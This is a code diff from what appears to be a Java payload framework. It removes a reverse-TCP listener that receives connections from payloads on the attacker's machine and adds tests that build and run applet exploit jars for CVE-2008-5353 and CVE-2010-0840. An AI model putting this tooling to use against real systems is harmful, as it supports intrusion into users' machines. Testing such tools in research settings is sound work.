@@ -31,61 +31,40 @@
  * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
  * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
+package javapayload.test;
 
-package javapayload.handler.stager;
+import java.io.File;
+import java.io.IOException;
 
-import java.io.PrintStream;
-import java.net.ServerSocket;
-import java.net.Socket;
+import javapayload.builder.CVE_2008_5353_AppletJarBuilder;
+import javapayload.builder.CVE_2010_0840_AppletJarBuilder;
 
-import javapayload.Parameter;
-import javapayload.handler.stage.StageHandler;
+public class BuilderTest14 extends BuilderTest {
+	public static class CVE_2008_5353TestRunner extends WaitingBuilderTestRunner {
+		protected String getCVEName() { return "2008_5353"; }
+		public String getName() { return "CVE_"+getCVEName()+" [kill]"; }
 
-public class ReverseTCP extends ListeningStagerHandler {
+		public void runBuilder(String[] args) throws Exception {
+			CVE_2008_5353_AppletJarBuilder.main(new String[] { "cve.jar", args[0] });
+		}
 
-	public ReverseTCP() {
-		super("Connect to a TCP port",  true, true, "Connect to a TCP port on the attacker's machine.");
-	};
-	
-	public Parameter[] getParameters() {
-		return new Parameter[] {
-				new Parameter("LHOST", false, Parameter.TYPE_HOST, "Local host to connect to"),
-				new Parameter("LPORT", false, Parameter.TYPE_PORT_HASH, "Local port to connect to, or # to auto-bind.")
-		};
-	}
-	
-	private ServerSocket serverSocket = null;
-	
-	protected void startListen(String[] parameters) throws Exception {
-		if (serverSocket == null) {
-			serverSocket = new ServerSocket(Integer.parseInt(parameters[2]));
+		public void runResult(String[] args) throws Exception {
+			runAppletAndWait(this, "cve.jar", "javapayload.exploit.CVE_"+getCVEName(), null, args);
+		}
+
+		public void cleanup() throws Exception {
+			if (!new File("applettest.html").delete())
+				throw new IOException("Unable to delete file");
+			if (!new File("cve.jar").delete())
+				throw new IOException("Unable to delete file");
 		}
 	}
 	
-	protected Object acceptSocket() throws Exception {
-		return serverSocket.accept();
-	}
-	
-	protected void stopListen() throws Exception {
-		serverSocket.close();
-		serverSocket = null;
-	}
-	
-	protected void handleSocket(Object socket, StageHandler stageHandler, String[] parameters, PrintStream errorStream) throws Exception {
-		Socket s = (Socket) socket;
-		stageHandler.handle(s.getOutputStream(), s.getInputStream(), parameters);
-	}
-	
-	protected boolean prepare(String[] parametersToPrepare) throws Exception {
-		if (parametersToPrepare[2].equals("#")) {
-			serverSocket = new ServerSocket(0);
-			parametersToPrepare[2] = ""+serverSocket.getLocalPort();	
-			return true;
+	public static class CVE_2010_0840TestRunner extends CVE_2008_5353TestRunner implements BuilderTestRunner {
+		protected String getCVEName() { return "2010_0840"; }
+
+		public void runBuilder(String[] args) throws Exception {
+			CVE_2010_0840_AppletJarBuilder.main(new String[] { "cve.jar", args[0] });
 		}
-		return false;
-	}
-	
-	protected String getTestArguments() {
-		return "localhost #";
 	}
 }
